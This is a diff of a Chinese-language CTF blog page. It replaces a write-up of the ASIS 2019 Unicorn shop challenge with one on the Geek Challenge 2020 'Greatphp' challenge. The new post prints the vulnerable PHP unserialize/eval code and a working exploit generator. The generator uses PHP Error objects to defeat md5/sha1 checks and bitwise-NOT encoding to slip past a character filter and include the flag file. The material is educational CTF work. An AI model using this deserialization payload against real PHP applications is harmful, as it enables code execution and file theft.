@@ -9,7 +9,7 @@
     
     <title>
         
-            Unicorn shop |
+            jikedatiaozhan2020-greatphp |
         
         paixiaoxing&#39;s Blog
     </title>
@@ -150,7 +150,7 @@
     <div class="article-content-container">
 
         <div class="article-title">
-            <span class="title-hover-animation">Unicorn shop</span>
+            <span class="title-hover-animation">jikedatiaozhan2020-greatphp</span>
         </div>
 
         
@@ -169,8 +169,8 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fas fa-edit"></i>&nbsp;
-        <span class="pc">2022-02-28 13:43:50</span>
-        <span class="mobile">2022-02-28 13:43</span>
+        <span class="pc">2022-03-31 14:16:57</span>
+        <span class="mobile">2022-03-31 14:16</span>
     </span>
     
     
@@ -179,7 +179,7 @@
             <ul>
                 
                     <li>
-                        <a href="/tags/ASIS/">ASIS</a>&nbsp;
+                        <a href="/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/">极客大挑战2020</a>&nbsp;
                     </li>
                 
             </ul>
@@ -202,30 +202,26 @@
         
 
         <div class="article-content markdown-body">
-            <h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p>刷题刷题。</p>
-<p>题目名字是独角兽商店</p>
-<p>进去看看</p>
-<p><img src="/2022/02/28/Unicorn-shop/6.png" alt="1"></p>
-<p>意思是我们输入商品名还有价钱来购买它</p>
-<p>啥也不输直接点购买看看会出现什么问题：</p>
-<p><img src="/2022/02/28/Unicorn-shop/1.png" alt="1"></p>
-<p>可以看到返回了一堆目录还有一个报错</p>
-<p>需要一个单独的unicode字符串作为参数</p>
-<p>那么我们试试输入，购买上面的便宜的商品看看，</p>
-<p>发现</p>
-<p><img src="/2022/02/28/Unicorn-shop/2.png" alt="1"></p>
-<p>测试一个最下面的那个，最下面吗那个应该是我们需要购买的flag</p>
-<p><img src="/2022/02/28/Unicorn-shop/4.png" alt="1"></p>
-<p>也不让访问</p>
-<p>看看源码</p>
-<p><img src="/2022/02/28/Unicorn-shop/3.png" alt="1"></p>
-<p>他在编码后面添加了一句提示，那么可能在编码方面可能会出现一些问题，上网查了一下，我们需要找到一个字符，它的数值需要大于1337，从而绕过这个过滤</p>
-<p>可以在这里找</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.compart.com/en/unicode/</span><br></pre></td></tr></table></figure>
+            <h2 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2><p>因为看到了原生类反序列化，看到这条，就来做一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="keyword">$this</span>-&gt;syc != <span class="keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="keyword">$this</span>-&gt;syc) === md5(<span class="keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="keyword">$this</span>-&gt;syc)=== sha1(<span class="keyword">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="keyword">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>直接搜索thousand，在里面找，只要它的数值大于1337的就行了</p>
-<p><img src="/2022/02/28/Unicorn-shop/5.png" alt="1"></p>
-<p>输入，返回flag</p>
+<p>提供了一个反序列化的点，只提供了一个类，需要绕过wakeup魔术方法中的条件，md5以及sha1的绕过在一般情况下是可以直接用数组进行绕过的，但是这里是类，没办法使用，这里就需要提到一个php的原生类：error或者exception，在这两个原生类中内置了__toString魔术方法，当他被调用的时候会自动报错从而将异常或者错误转换成字符串。</p>
+<p>简单说明一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Error</span>: payload in D:\php\phpError.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里会输出当前的报错信息”payload”，以及当前的行号，但是我们输入的错误代码斌没有被回显，这样的话就提供了我们构造判断的条件</p>
+<p>我们可以令他回显不出来的地方不同来绕过判断，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> SYCLOVER();</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$c</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这样即可绕过判断，进入下面，我们需要拿到flag的话只需要修改payload中的内容即可</p>
+<p>看一下过滤：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    (     )     &quot;     &#x27;</span><br></pre></td></tr></table></figure>
+
+<p>绕过的话可以尝试一下取反绕过，因为括号被过滤了无法调用函数，可以构造include“文件名字符串”的形式来，构造中间的数，因为取反结束之后include后面就是字符串了，不需要用单双引号来包裹。最后flag是在根目录下（多测一下就好了）</p>
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.urldecode(<span class="string">&#x27;%D0%99%93%9E%98&#x27;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> SYCLOVER();</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$c</span>));</span><br></pre></td></tr></table></figure>
+
+<p>注意这里写入的执行文件需要提前用<code>?&gt;</code>来闭合前面的报错内容，这样的话就可以执行后面的包含内容了</p>
 
         </div>
 
@@ -233,11 +229,11 @@
             <div class="post-copyright-info">
                 <div class="article-copyright-info-container">
     <ul>
-        <li>Post title：Unicorn shop</li>
+        <li>Post title：jikedatiaozhan2020-greatphp</li>
         <li>Post author：paixiaoxing</li>
-        <li>Create time：2022-02-28 13:43:50</li>
+        <li>Create time：2022-03-31 14:16:57</li>
         <li>
-            Post link：https://keep.xpoet.cn/2022/02/28/Unicorn-shop/
+            Post link：https://keep.xpoet.cn/2022/03/31/jikedatiaozhan2020-greatphp/
         </li>
         <li>
             Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
@@ -252,7 +248,7 @@
             <ul class="post-tags-box">
                 
                     <li class="tag-item">
-                        <a href="/tags/ASIS/">#ASIS</a>&nbsp;
+                        <a href="/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/">#极客大挑战2020</a>&nbsp;
                     </li>
                 
             </ul>
@@ -264,13 +260,13 @@
                     <div class="article-prev">
                         <a class="prev"
                            rel="prev"
-                           href="/2022/02/28/%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/"
+                           href="/2022/03/31/canyougussit/"
                         >
                             <span class="left arrow-icon flex-center">
                               <i class="fas fa-chevron-left"></i>
                             </span>
                             <span class="title flex-center">
-                                <span class="post-nav-title-item">朴实无华</span>
+                                <span class="post-nav-title-item">Can you guess it ?</span>
                                 <span class="post-nav-item">Prev posts</span>
                             </span>
                         </a>
@@ -280,10 +276,10 @@
                     <div class="article-next">
                         <a class="next"
                            rel="next"
-                           href="/2022/02/22/ctf-show(%E7%88%86%E7%A0%B4-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-sql%E6%B3%A8%E5%85%A5-php%E7%89%B9%E6%80%A7)/"
+                           href="/2022/03/30/ctf-show2/"
                         >
                             <span class="title flex-center">
-                                <span class="post-nav-title-item">ctf-show(爆破-命令执行-php特性-文件上传-sql注入)</span>
+                                <span class="post-nav-title-item">ctf-show2</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex-center">
@@ -409,7 +405,7 @@
         <aside class="page-aside">
             <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ASIS-2019-Unicorn-shop"><span class="nav-number">1.</span> <span class="nav-text">[ASIS 2019]Unicorn shop</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Greatphp"><span class="nav-number">1.</span> <span class="nav-text">[极客大挑战 2020]Greatphp</span></a></li></ol>
     </div>
 </div>
         </aside>
